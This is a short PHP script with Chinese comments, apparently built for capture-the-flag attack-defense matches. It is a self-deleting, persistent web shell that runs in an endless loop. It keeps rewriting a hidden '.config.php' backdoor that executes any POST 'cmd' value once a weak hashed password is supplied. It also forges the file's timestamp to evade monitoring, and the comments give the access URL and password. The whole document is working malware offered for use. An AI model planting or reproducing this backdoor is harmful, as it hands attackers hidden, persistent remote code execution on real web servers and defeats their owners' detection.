<?php
ignore_user_abort(true); // 忽略客户端断开连接，确保脚本在后台持续运行
set_time_limit(0);       // 设置脚本执行时间无限制，防止因超时被终止
unlink(__FILE__);        // 删除当前执行的不死马脚本文件，实现隐蔽

$file = '.config.php';   // 定义生成的隐藏后门文件名（以.开头在Linux下隐藏）
$code = '<?php if(md5($_GET["pass"])=="e10adc3949ba59abbe56e057f20f883e"){@eval($_POST["cmd"]);} ?>';
// 定义后门内容：包含简单的密码验证和命令执行功能，密码为 "123456" 的MD5值，防止其他队伍直接利用  http://xxxxx/.config.php?pass=123456
// 蚁剑密码为cmd

while (1) {
    file_put_contents($file, $code); // 将后门代码写入文件
    system('touch -m -d "2018-01-01 00:00:00" ' . $file); // 修改文件时间为过去，规避基于时间的文件监控
    usleep(5000); // 暂停5000微秒（0.005秒），降低CPU占用并确保持续写入
}
?>